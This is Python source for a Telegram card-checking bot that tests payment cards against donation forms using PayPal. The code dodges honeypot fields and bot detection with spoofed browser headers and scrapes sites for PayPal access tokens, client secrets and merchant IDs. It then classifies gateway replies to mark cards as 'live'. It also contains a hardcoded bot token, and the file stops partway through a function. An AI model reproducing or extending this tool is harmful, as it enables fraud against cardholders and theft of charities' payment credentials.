#!/usr/bin/env python3
# =====================================================
#  Card Checker Bot — FINAL v15.1 (Honeypot Killer)
#  - Honeypot fields always empty
#  - Real browser headers (Origin/Referer/Accept)
#  - Persistent cookies from initial GET
#  - Fixed User-Agent (not random)
#  - Uses MINIMUM amount from site
#  - B1: "Please enter your title" returned as-is
#  - "PayPal orders are captured" = LIVE (never converted)
#  - Ultimate token decryption
#  - Thread-safe mass scan
# =====================================================
import telebot
import time
import threading
from telebot import types
import requests, random, json, re, base64, binascii
import os, sys, traceback, hashlib
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse, unquote
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from fake_useragent import UserAgent
    _UU = UserAgent()
    def rand_ua():
        try: return _UU.random
        except: return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
except:
    _UAS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ]
    def rand_ua(): return random.choice(_UAS)


token = '8689698569:AAFJjLfJ9ztJg9QNJugf8xJbb0Ernow8vG8'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
mass_active = {}
mass_pause = {}
mass_lock = threading.Lock()

try:
    if not os.path.exists('blockusers.txt'):
        open('blockusers.txt', 'w').write('')
    if not os.path.exists('users.txt'):
        open('users.txt', 'w').write('')
except: pass


# ============================================================
#  Constants
# ============================================================
HONEYPOT_KEYS = ['honeypot', 'honey_pot', 'honey-pot', 'honeypot_field', 'give-honeypot',
                 'give_honeypot', 'website', 'url_field', 'urlfield', 'user_url', 'userurl']

# Real browser User-Agent (constant per session)
BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'


# ============================================================
#  Helpers
# ============================================================
def save_user(uid):
    try:
        users = open('users.txt').read().splitlines()
        if str(uid) not in users:
            open('users.txt', 'a').write(f"{uid}\n")
    except: pass


def is_blocked(uid):
    try:
        blocked = [l.strip() for l in open('blockusers.txt').read().splitlines() if l.strip()]
        return str(uid) in blocked
    except: return False


def safe_edit_message(cid, mid, text, retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(chat_id=cid, message_id=mid, text=text, parse_mode="HTML")
        except Exception as e:
            err = str(e)
            if "not modified" in err: return None
            if "429" in err:
                try: w = int(err.split("retry after ")[1].split(")")[0])
                except: w = 30
                time.sleep(min(w, 60))
            else: break
    return None


def safe_send_document(cid, path, caption="", retries=5):
    try:
        if not os.path.exists(path): return None
    except: return None
    for i in range(retries):
        try:
            with open(path, 'rb') as f:
                return bot.send_document(cid, f, caption=caption, parse_mode="HTML")
        except Exception as e:
            err = str(e)
            if "can't parse" in err.lower() or "bad request" in err.lower():
                try:
                    with open(path, 'rb') as f:
                        plain = re.sub(r'<[^>]+>', '', caption)
                        return bot.send_document(cid, f, caption=plain[:1024])
                except: pass
            if "429" in err:
                try: w = int(err.split("retry after ")[1].split(")")[0])
                except: w = 30
                time.sleep(min(w, 60))
            elif i < retries - 1: time.sleep(2)
            else: break
    return None


def safe_send_message(cid, text, retries=3, reply_markup=None):
    for i in range(retries):
        try:
            return bot.send_message(cid, text, parse_mode="HTML", reply_markup=reply_markup)
        except Exception as e:
            err = str(e)
            if "429" in err:
                try: w = int(err.split("retry after ")[1].split(")")[0])
                except: w = 30
                time.sleep(min(w, 60))
            else: break
    return None


def save_progress(uid, data):
    try:
        with open(f'progress_{uid}.json', 'w', encoding='utf-8') as f: json.dump(data, f)
    except: pass


def load_progress(uid):
    try:
        return json.load(open(f'progress_{uid}.json', 'r', encoding='utf-8'))
    except: return None


def clear_progress(uid):
    try: os.remove(f'progress_{uid}.json')
    except: pass


def safe_url(link):
    try:
        if not link or not isinstance(link, str): return None
        link = link.strip()
        if len(link) < 8: return None
        if not link.startswith(("http://", "https://")):
            if link.startswith("www."):
                link = "https://" + link
            elif "." in link:
                link = "https://" + link
            else:
                return None
        parsed = urlparse(link)
        if not parsed.netloc or not parsed.netloc.strip(): return None
        if '://none' in link.lower(): return None
        return link
    except: return None


def is_honeypot_field(name):
    """هل الحقل ده honeypot؟"""
    if not name: return False
    nl = name.lower()
    for k in HONEYPOT_KEYS:
        if k in nl: return True
    return False


def strip_honeypots(form_data):
    """شيل كل حقول الـ honeypot من الـ form"""
    try:
        return {k: v for k, v in form_data.items() if not is_honeypot_field(k)}
    except:
        return form_data


# ============================================================
#  Ultimate Decoder
# ============================================================
def ultimate_decode(s):
    results = []
    if not s or not isinstance(s, str): return results
    s = s.strip()
    try:
        padded = s + '=' * (-len(s) % 4)
        results.append(base64.b64decode(padded).decode('utf-8', errors='ignore'))
    except: pass
    try:
        padded = s + '=' * (-len(s) % 4)
        results.append(base64.urlsafe_b64decode(padded).decode('utf-8', errors='ignore'))
    except: pass
    try:
        if all(c in '0123456789abcdefABCDEF' for c in s) and len(s) % 2 == 0:
            results.append(bytes.fromhex(s).decode('utf-8', errors='ignore'))
    except: pass
    try:
        results.append(unquote(s))
    except: pass
    try:
        if s.count('.') == 2:
            parts = s.split('.')
            padded = parts[1] + '=' * (-len(parts[1]) % 4)
            results.append(base64.urlsafe_b64decode(padded).decode('utf-8', errors='ignore'))
    except: pass
    try:
        padded = s + '=' * (-len(s) % 4)
        dec1 = base64.b64decode(padded).decode('utf-8', errors='ignore')
        if dec1 and len(dec1) > 10:
            padded2 = dec1 + '=' * (-len(dec1) % 4)
            results.append(base64.b64decode(padded2).decode('utf-8', errors='ignore'))
    except: pass
    return [r for r in results if r and len(r) > 5]


# ============================================================
#  LIVE RESPONSES
# ============================================================
LIVE_RESPONSES = [
    'CHARGE', 'Payer cannot pay for this transaction',
    'There was an issue with your donation transaction',
    'Your card was declined', 'card was declined',
    'PayPal orders are captured',
    'INSTRUMENT_DECLINED', 'ORDER_NOT_APPROVED', 'PAYER_ACTION_REQUIRED',
    'PAYER_CANNOT_PAY', 'PAYMENT_DENIED', 'PAYEE_ACCOUNT_RESTRICTED',
    'PAYEE_NOT_CONSENTED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
    'PERMISSION_DENIED', 'POSTAL_CODE_REQUIRED', 'REFERENCED_CARD_EXPIRED',
    'CARD_EXPIRED', 'AMOUNT_MISMATCH', 'CANNOT_BE_NEGATIVE',
    'CANNOT_BE_ZERO_OR_NEGATIVE', 'CURRENCY_NOT_SUPPORTED',
    'DECIMAL_PRECISION', 'DECIMALS_NOT_SUPPORTED', 'DUPLICATE_INVOICE_ID',
    'INCOMPATIBLE_PARAMETER_VALUE', 'INVALID_PARAMETER_SYNTAX',
    'INVALID_RESOURCE_ID', 'INVALID_STRING_LENGTH', 'ITEM_TOTAL_MISMATCH',
    'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED', 'MISSING_REQUIRED_PARAMETER',
    'ORDER_ALREADY_AUTHORIZED', 'ORDER_ALREADY_CAPTURED',
    'REDIRECT_PAYER_FOR_ALTERNATE_FUNDING', 'VALIDATION_ERROR',
    'UNPROCESSABLE_ENTITY',
    'DO_NOT_HONOR', 'GENERIC_DECLINE', 'CVV2_FAILURE', 'CVV_FAILURE',
    'INSUFFICIENT_FUNDS', 'INVALID_PIN', 'CARD_CLOSED',
    'PICKUP_CARD_SPECIAL_CONDITIONS', 'UNAUTHORIZED_USER', 'AVS_FAILURE',
    'INVALID_OR_RESTRICTED_CARD', 'SOFT_AVS', 'DUPLICATE_TRANSACTION',
    'INVALID_TRANSACTION', 'EXPIRED_CARD', 'INCORRECT_PIN_REENTER',
    'INVALID_DATA_FORMAT', 'INVALID_AMOUNT',
    'INVALID_TRANSACTION_CARD_ISSUER_ACQUIRER', 'INVALID_CAPTURE_DATE',
    'INVALID_CURRENCY_CODE', 'INVALID_ACCOUNT', 'INVALID_TERMINAL',
    'INVALID_MERCHANT', 'BAD_PROCESSING_CODE', 'INVALID_MCC',
    'INVALID_EXPIRATION', 'INVALID_CARD_VERIFICATION_VALUE',
    'INVALID_LIFE_CYCLE_OF_TRANSACTION', 'INVALID_ORDER',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'REVERSAL_REJECTED', 'INVALID_ISSUE',
    'ISSUER_NOT_AVAILABLE_NOT_RETRIABLE', 'ISSUER_NOT_AVAILABLE_RETRIABLE',
    'ACCOUNT_NOT_ON_FILE', 'ERROR_3DS', 'AUTHENTICATION_FAILED',
    'BIN_ERROR', 'PIN_ERROR', 'CARD_EXPIRED_REPLACE',
    'SENDING_LIMIT_EXCEEDED', 'TRANSACTION_RECEIVING_LIMIT_EXCEEDED',
    'CURRENCY_MISMATCH', 'INVALID_ACCOUNT_STATUS',
    'REJECTED_DUE_TO_RISK_REVERSAL', 'TRANSACTION_REFUSED',
    'INTERNAL_SERVER_ERROR', 'INVALID_REQUEST', 'AUTHENTICATION_FAILURE',
    'NOT_AUTHORIZED', 'RESOURCE_NOT_FOUND',
    'PAYER_ACCOUNT_RESTRICTED', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'PAYEE_BLOCKED_TRANSACTION', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED',
    'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'LOST_OR_STOLEN',
    'COMPLIANCE_VIOLATION', 'CAPTURE_DECLINED', 'AUTHORIZATION_DENIED',
    'CRYPTOGRAPHIC_FAILURE', 'TX_ATTEMPTS_EXCEED_LIMIT', 'DECLINED',
    'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
    'TRANSACTION_NOT_PERMITTED', 'SECURITY_VIOLATION',
    'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED_PLEASE_RETRY',
    'For Visa, Mastercard', 'nothing matches',
    'address and postal code are both incorrect',
    'CVV2/CSC does not match', 'account closed as fraudulent',
    'card holder wants to stop all recurring payment transactions',
    'Stop recurring payment requests',
    'The requested action could not be performed',
    'semantically incorrect', 'failed business validation',
    'Payer has not yet approved the Order', 'Please redirect the payer',
    'provide a valid payment_source', 'issue with your donation',
    'transaction was declined',
]


def is_live_response(resp):
    try:
        if not resp: return False
        s = str(resp).strip()
        if not s: return False
        # ✅ Honeypot = مش live
        if 'honeypot' in s.lower():
            return False
        # ✅ PayPal orders are captured = LIVE دايماً
        if 'paypal orders are captured' in s.lower():
            return True
        # ✅ B1: رسائل validation مش live
        if any(p in s.lower() for p in ['please enter', 'please fill', 'please select', 'required field', 'is required']):
            return False
        up = s.upper()
        return any(k.upper() in up for k in LIVE_RESPONSES)
    except: return False


RESULT_PRIORITY = [
    ('CHARGE', 200), ('PayPal orders are captured', 199),
    ('INSUFFICIENT_FUNDS', 195),
    ('INVALID_OR_RESTRICTED_CARD', 190), ('TRANSACTION_NOT_PERMITTED', 188),
    ('Payer cannot pay', 185), ('PAYER_CANNOT_PAY', 185), ('ORDER_NOT_APPROVED', 185),
    ('There was an issue with your donation', 185),
    ('Your card was declined', 185), ('card was declined', 185),
    ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
    ('SUSPECTED_FRAUD', 178), ('CVV2_FAILURE', 175), ('CVV_FAILURE', 175),
    ('EXPIRED_CARD', 172), ('DO_NOT_HONOR', 170),
    ('RESTRICTED_OR_INACTIVE_ACCOUNT', 168),
    ('ACCOUNT_CLOSED', 166), ('LOST_OR_STOLEN', 164),
    ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', 162),
    ('REATTEMPT_NOT_PERMITTED', 160), ('ACCOUNT_BLOCKED_BY_ISSUER', 158),
    ('GENERIC_DECLINE', 155), ('TRANSACTION_REFUSED', 153),
    ('COMPLIANCE_VIOLATION', 150), ('SECURITY_VIOLATION', 148),
    ('CAPTURE_DECLINED', 145), ('AUTHORIZATION_DENIED', 143),
    ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 140), ('CRYPTOGRAPHIC_FAILURE', 138),
    ('TRANSACTION_CANNOT_BE_COMPLETED', 135), ('DECLINED_PLEASE_RETRY', 132),
    ('TX_ATTEMPTS_EXCEED_LIMIT', 130), ('PAYEE_BLOCKED_TRANSACTION', 128),
    ('PAYEE_ACCOUNT_RESTRICTED', 126), ('PAYER_ACCOUNT_RESTRICTED', 124),
    ('DECLINED', 100),
]


def score_result(resp):
    try:
        if not resp: return 0
        up = str(resp).upper()
        for k, s in RESULT_PRIORITY:
            if k.upper() in up: return s
        return 1
    except: return 0


def normalize_result(resp):
    try:
        if not resp: return "DECLINED"
        s = str(resp)
        if 'paypal orders are captured' in s.lower():
            return "PayPal orders are captured"
        if 'honeypot' in s.lower():
            return s  # نعرضها زي ما هي
        if any(p in s.lower() for p in ['please enter', 'please fill', 'please select', 'required field']):
            return s
        up = s.upper()
        if 'There was an issue with your donation' in s:
            return "There was an issue with your donation transaction: Your card was declined."
        if 'Your card was declined' in s or 'card was declined' in s.lower():
            return "Your card was declined."
        if 'ORDER_NOT_APPROVED' in up or 'PAYER_CANNOT_PAY' in up or 'Payer cannot pay' in s:
            return "Payer cannot pay for this transaction."
        return s
    except: return "DECLINED"


# ============================================================
#  PayPalTester — v15.1
# ============================================================
class PayPalTester:
    def __init__(self, url):
        url = safe_url(url)
        if not url: url = "https://invalid.local/"
        self.page_url = url
        try:
            parsed = urlparse(url)
            self.url = parsed.netloc or "invalid.local"
            self.inurl = parsed.path or "/"
            if parsed.query: self.inurl += "?" + parsed.query
        except:
            self.url = "invalid.local"
            self.inurl = "/"

        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.paypal = None
        self.client_id = None
        self.client_secret = None
        self.donation = "1.00"
        self.minimum = "5.00"
        self.currency = "USD"
        self.price_levels = []
        self.id_form1 = None
        self.id_form2 = None
        self.nonec = None
        self.au = None
        self.ajax_url = None
        self.current_price_id = None
        self.all_content = ""
        self.page_html = ""
        self.auth_method = "none"
        self.form_fields = {}
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.r = requests.Session()
        try: self.r.verify = False
        except: pass
        # ✅ User-Agent ثابت (مش عشوائي كل request)
        self.ua = BROWSER_UA
        self.base_headers = {
            'user-agent': self.ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'connection': 'keep-alive',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'cache-control': 'max-age=0',
        }

    def _safe_get(self, url, timeout=15, referer=None):
        try:
            if not url or not isinstance(url, str): return None
            if not url.startswith(("http://", "https://")): return None
            if '://none' in url.lower(): return None
            headers = dict(self.base_headers)
            if referer:
                headers['referer'] = referer
            return self.r.get(url, headers=headers, timeout=timeout)
        except: return None

    def _safe_build_url(self, base, path):
        try:
            if not base or not isinstance(base, str): return None
            if not base.strip(): return None
            if path.startswith('//'): return 'https:' + path
            elif path.startswith('/'): return f'https://{base}{path}'
            elif not path.startswith('http'): return f'https://{base}/{path}'
            return path
        except: return None

    def _get_ajax_headers(self):
        """Headers مخصصة لـ ajax — متصفح حقيقي"""
        try:
            origin = f'https://{self.url}' if self.url and self.url != 'invalid.local' else ''
            return {
                'user-agent': self.ua,
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'x-requested-with': 'XMLHttpRequest',
                'origin': origin,
                'referer': self.page_url,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }
        except:
            return {'user-agent': self.ua, 'x-requested-with': 'XMLHttpRequest'}

    def _fetch_page(self):
        try:
            r = self._safe_get(self.page_url, timeout=20)
            if r and r.status_code == 200 and r.text:
                self.page_html = r.text
                self.all_content = r.text
                return True
        except: pass
        time.sleep(0.3)
        try:
            r = self._safe_get(self.page_url, timeout=20)
            if r and r.status_code == 200 and r.text:
                self.page_html = r.text
                self.all_content = r.text
                return True
        except: pass
        return False

    def _load_iframes(self):
        try:
            if not self.url or not self.page_html: return
            patterns = [
                r'<iframe[^>]*src=["\']([^"\']*give[^"\']*)["\']',
                r'<iframe[^>]*src=["\']([^"\']*donation[^"\']*)["\']',
                r'<iframe[^>]*src=["\']([^"\']*form[^"\']*)["\']',
                r'<iframe[^>]*src=["\']([^"\']*paypal[^"\']*)["\']',
                r'<iframe[^>]*src=["\']([^"\']*checkout[^"\']*)["\']',
            ]
            for pattern in patterns:
                for m in re.finditer(pattern, self.page_html, re.IGNORECASE):
                    try:
                        ifu = m.group(1)
                        if not ifu or not isinstance(ifu, str): continue
                        full = self._safe_build_url(self.url, ifu)
                        if not full: continue
                        if '://none' in full.lower(): continue
                        r = self._safe_get(full, timeout=12, referer=self.page_url)
                        if r and r.status_code == 200 and r.text:
                            self.all_content += "\n" + r.text
                            if not self.id_form2:
                                try:
                                    parsed = urlparse(full)
                                    if parsed.netloc and parsed.netloc.strip():
                                        self.url = parsed.netloc
                                        self.inurl = parsed.path or '/'
                                except: pass
                    except: continue
        except: pass

    def _load_all_js(self):
        try:
            if not self.url or not self.page_html: return
            js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', self.page_html)
            priority = [u for u in js_urls if any(k in u.lower() for k in ['give','donation','paypal','commerce','token','client','checkout','braintree','stripe','payment'])]
            others = [u for u in js_urls if u not in priority]
            ordered = (priority + others)[:20]
            for js_url in ordered:
                try:
                    if not self.url: continue
                    if not js_url or not isinstance(js_url, str): continue
                    full = self._safe_build_url(self.url, js_url)
                    if not full: continue
                    if '://none' in full.lower(): continue
                    r = self._safe_get(full, timeout=8, referer=self.page_url)
                    if r and r.status_code == 200 and r.text:
                        self.all_content += "\n" + r.text
                except: continue
            for m in re.finditer(r'<script[^>]*>(.*?)</script>', self.page_html, re.DOTALL | re.IGNORECASE):
                try:
                    inline = m.group(1)
                    if inline and len(inline) > 50:
                        self.all_content += "\n" + inline
                except: continue
            for m in re.finditer(r'<script[^>]*type=["\']application/(?:ld\+)?json["\'][^>]*>(.*?)</script>', self.page_html, re.DOTALL | re.IGNORECASE):
                try:
                    if m.group(1): self.all_content += "\n" + m.group(1)
                except: continue
            for m in re.finditer(r'data-[\w-]+=["\']([^"\']{20,})["\']', self.page_html):
                try:
                    val = m.group(1)
                    if any(k in val.lower() for k in ['token', 'a21', 'eyj', 'client', 'merchant']):
                        self.all_content += "\n" + val
                except: continue
        except: pass

    def _extract_basic(self):
        try:
            c = self.all_content
            if not c: return
            for p in [r'name="give-form-id-prefix"\s+value="([^"]+)"',
                      r'"give-form-id-prefix"\s*:\s*"([^"]+)"',
                      r'data-form-id-prefix=["\']([^"\']+)["\']']:
                m = re.search(p, c)
                if m: self.id_form1 = m.group(1); break
            for p in [r'name="give-form-id"\s+value="([^"]+)"',
                      r'"give-form-id"\s*:\s*"([^"]+)"',
                      r'"form_id"\s*:\s*"?(\d+)"?',
                      r'data-form-id=["\']([^"\']+)["\']']:
                m = re.search(p, c)
                if m: self.id_form2 = m.group(1); break
            for p in [r'name="give-form-hash"\s+value="([^"]+)"',
                      r'"give-form-hash"\s*:\s*"([^"]+)"',
                      r'"nonce"\s*:\s*"([a-f0-9]{8,12})"',
                      r'name="_wpnonce"\s+value="([^"]+)"']:
                m = re.search(p, c)
                if m: self.nonec = m.group(1); break
            m = re.search(r'name="give-form-minimum"\s+value="([^"]*)"', c)
            if m and m.group(1).strip(): self.minimum = m.group(1).strip()
            for p in [r'name="give-currency"\s+value="([A-Za-z]{3})"',
                      r'"give-currency"\s*:\s*"([A-Za-z]{3})"',
                      r'"currency"\s*:\s*"([A-Za-z]{3})"',
                      r'data-currency=["\']([A-Za-z]{3})["\']']:
                m = re.search(p, c, re.IGNORECASE)
                if m: self.currency = m.group(1).upper(); break
            for p in [r'name="give-price-id"\s+value="([^"]+)"',
                      r'"give-price-id"\s*:\s*"([^"]+)"']:
                m = re.search(p, c)
                if m: self.current_price_id = m.group(1); break
            self.price_levels = []
            for pat, mode in [
                (r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', 1),
                (r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', 2),
            ]:
                for m in re.finditer(pat, c):
                    try:
                        if mode == 1: pid, amt = m.group(1), float(m.group(2))
                        else: amt, pid = float(m.group(1)), m.group(2)
                        self.price_levels.append((pid, amt))
                    except: pass
            seen_pids = set(); unique = []
            for pid, amt in self.price_levels:
                if pid not in seen_pids and amt > 0:
                    seen_pids.add(pid); unique.append((pid, amt))
            self.price_levels = sorted(unique, key=lambda x: x[1])
            if 'admin-ajax.php' in c:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        except: pass

    def _extract_all_form_fields(self):
        try:
            c = self.all_content
            if not c: return
            self.form_fields = {}
            for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>', c, re.DOTALL | re.IGNORECASE):
                try:
                    name = m.group(1); inner = m.group(2); tag = m.group(0)
                    required = 'required' in tag.lower() or 'aria-required="true"' in tag.lower()
                    options = []
                    for om in re.finditer(r'<option[^>]*value=["\']([^"\']*)["\'][^>]*>(.*?)</option>', inner, re.DOTALL):
                        val = om.group(1).strip()
                        val = val.replace('&amp;', '&').replace('&#039;', "'").replace('&quot;', '"').replace('&lt;', '<').replace('&gt;', '>')
                        if val: options.append(val)
                    self.form_fields[name] = {'type': 'select', 'required': required, 'options': options}
                except: continue
            radio_groups = {}
            for m in re.finditer(r'<input[^>]*type=["\']radio["\'][^>]*>', c, re.IGNORECASE):
                try:
                    tag = m.group(0)
                    name_m = re.search(r'name=["\']([^"\']+)["\']', tag)
                    value_m = re.search(r'value=["\']([^"\']*)["\']', tag)
                    if name_m and value_m:
                        name = name_m.group(1); val = value_m.group(1)
                        val = val.replace('&amp;', '&').replace('&#039;', "'").replace('&quot;', '"')
                        if name not in radio_groups:
                            radio_groups[name] = {'required': 'required' in tag.lower() or 'aria-required="true"' in tag.lower(), 'options': []}
                        if val and val not in radio_groups[name]['options']:
                            radio_groups[name]['options'].append(val)
                except: continue
            for name, info in radio_groups.items():
                self.form_fields[name] = {'type': 'radio', 'required': info['required'], 'options': info['options']}
            for m in re.finditer(r'<input[^>]*type=["\']checkbox["\'][^>]*>', c, re.IGNORECASE):
                try:
                    tag = m.group(0)
                    name_m = re.search(r'name=["\']([^"\']+)["\']', tag)
                    value_m = re.search(r'value=["\']([^"\']*)["\']', tag)
                    if name_m:
                        name = name_m.group(1)
                        val = value_m.group(1) if value_m else 'on'
                        val = val.replace('&amp;', '&').replace('&#039;', "'").replace('&quot;', '"')
                        required = 'required' in tag.lower() or 'aria-required="true"' in tag.lower()
                        if name not in self.form_fields:
                            self.form_fields[name] = {'type': 'checkbox', 'required': required, 'options': [val]}
                        else:
                            if val not in self.form_fields[name]['options']:
                                self.form_fields[name]['options'].append(val)
                except: continue
            for m in re.finditer(r'<input[^>]*type=["\'](text|email|tel|number|date|password)["\'][^>]*>', c, re.IGNORECASE):
                try:
                    tag = m.group(0)
                    name_m = re.search(r'name=["\']([^"\']+)["\']', tag)
                    if name_m:
                        name = name_m.group(1)
                        required = 'required' in tag.lower() or 'aria-required="true"' in tag.lower()
                        input_type = m.group(1).lower()
                        if name not in self.form_fields:
                            self.form_fields[name] = {'type': input_type, 'required': required, 'options': []}
                except: continue
            for m in re.finditer(r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>', c, re.IGNORECASE):
                try:
                    name = m.group(1)
                    tag = m.group(0)
                    required = 'required' in tag.lower()
                    if name not in self.form_fields:
                        self.form_fields[name] = {'type': 'text', 'required': required, 'options': []}
                except: continue
        except: pass

    def _extract_tokens_ultimate(self):
        if self.au: return True
        try:
            c = self.all_content
            if not c: return False
            token_patterns = [
                r'"data-client-token"\s*:\s*"([^"]+)"',
                r'data-client-token=["\']([^"\']+)["\']',
                r'"clientToken"\s*:\s*"([^"]+)"',
                r'client-token=["\']([^"\']+)["\']',
                r'client_token=["\']([^"\']+)["\']',
                r'"client_token"\s*:\s*"([^"]+)"',
                r'"token"\s*:\s*"([A-Za-z0-9+/=_-]{40,})"',
                r'"(BA[A-Za-z0-9+/=_-]{40,})"',
                r'"data-token"\s*:\s*"([^"]+)"',
            ]
            for pat in token_patterns:
                for m in re.finditer(pat, c, re.IGNORECASE):
                    enc = m.group(1)
                    decoded_variants = ultimate_decode(enc)
                    for dec in decoded_variants:
                        tm = re.search(r'"accessToken"\s*:\s*"([^"]+)"', dec)
                        if tm: self.au = tm.group(1)
                        mm = re.search(r'merchant_id=([\w]+)', dec)
                        if mm: self.paypal = mm.group(1)
                        else:
                            mm = re.search(r'"merchantId"\s*:\s*"([^"]+)"', dec)
                            if mm: self.paypal = mm.group(1)
                        cm = re.search(r'"clientId"\s*:\s*"([^"]+)"', dec)
                        if cm: self.client_id = cm.group(1)
                        sm = re.search(r'"clientSecret"\s*:\s*"([^"]+)"', dec)
                        if sm: self.client_secret = sm.group(1)
                        for jwt_m in re.finditer(r'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', dec):
                            try:
                                jwt = jwt_m.group(1)
                                parts = jwt.split('.')
                                padded = parts[1] + '=' * (-len(parts[1]) % 4)
                                payload = json.loads(base64.urlsafe_b64decode(padded))
                                if 'accessToken' in payload: self.au = payload['accessToken']
                                if 'clientId' in payload: self.client_id = payload['clientId']
                                if 'merchant_id' in payload: self.paypal = payload['merchant_id']
                            except: pass
                        if self.au: return True
                    if len(enc) > 30 and not self.au:
                        self.au = enc
            for p in [r'"accessToken"\s*:\s*"([^"]+)"',
                      r'accessToken["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                      r'"access_token"\s*:\s*"([^"]+)"']:
                m = re.search(p, c, re.IGNORECASE)
                if m and len(m.group(1)) > 20:
                    self.au = m.group(1)
                    return True
            for p in [r'"(A21[A-Za-z0-9+/=_-]{40,})"',
                      r"'(A21[A-Za-z0-9+/=_-]{40,})'",
                      r'\b(A21[A-Za-z0-9+/=_-]{40,})\b']:
                m = re.search(p, c)
                if m:
                    self.au = m.group(1)
                    return True
            for p in [r'"(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"',
                      r"'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)'"]:
                m = re.search(p, c)
                if m:
                    jwt = m.group(1)
                    try:
                        parts = jwt.split('.')
                        padded = parts[1] + '=' * (-len(parts[1]) % 4)
                        payload = json.loads(base64.urlsafe_b64decode(padded))
                        if 'accessToken' in payload: self.au = payload['accessToken']
                        if 'clientId' in payload: self.client_id = payload['clientId']
                        if 'merchant_id' in payload: self.paypal = payload['merchant_id']
                        if self.au: return True
                    except: pass
            if not self.client_id:
                for p in [
                    r'client-id=["\']([A-Za-z0-9_-]{20,})["\']',
                    r'"clientId"\s*:\s*"([A-Za-z0-9_-]{20,})"',
                    r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
                    r'"client_id"\s*:\s*"([A-Za-z0-9_-]{20,})"',
                    r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
                ]:
                    m = re.search(p, c, re.IGNORECASE)
                    if m: self.client_id = m.group(1); break
            if not self.paypal:
                for p in [
                    r'merchant-id=["\']([A-Za-z0-9]+)["\']',
                    r'"merchantId"\s*:\s*"([A-Za-z0-9]+)"',
                    r'"merchant_id"\s*:\s*"([A-Za-z0-9]+)"',
                    r'merchant_id=([A-Za-z0-9]+)',
                ]:
                    m = re.search(p, c, re.IGNORECASE)
                    if m: self.paypal = m.group(1); break
        except: pass
        return bool(self.au)

    def _try_oauth(self):
        if self.au or not self.client_id: return False
        if not self.client_secret: return False
        try:
            r = self.r.post('https://api-m.paypal.com/v1/oauth2/token',
                auth=(self.client_id, self.client_secret),
                data={'grant_type': 'client_credentials'},
                headers={'user-agent': self.ua}, timeout=10)
            if r.status_code == 200:
                j = r.json()
                if 'access_token' in j:
                    self.au = j['access_token']
                    return True
        except: pass
        return False

    def _try_ajax_client_token(self):
        if self.au or not self.ajax_url or not self.id_form2: return False
        for action in ['give_paypal_commerce_get_client_token', 'get_client_token',
                       'paypal_get_client_token', 'give_paypal_get_client_token']:
            try:
                headers = self._get_ajax_headers()
                r = self.r.post(self.ajax_url, data={'action': action, 'form-id': self.id_form2},
                    headers=headers, timeout=8)
                if r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        token = None
                        if 'data' in j:
                            if isinstance(j['data'], str): token = j['data']
                            elif isinstance(j['data'], dict):
                                token = (j['data'].get('client_token') or 
                                        j['data'].get('token') or 
                                        j['data'].get('access_token'))
                        if not token:
                            token = (j.get('client_token') or j.get('token') or j.get('access_token'))
                        if token:
                            for dec in ultimate_decode(token):
                                tm = re.search(r'"accessToken"\s*:\s*"([^"]+)"', dec)
                                if tm:
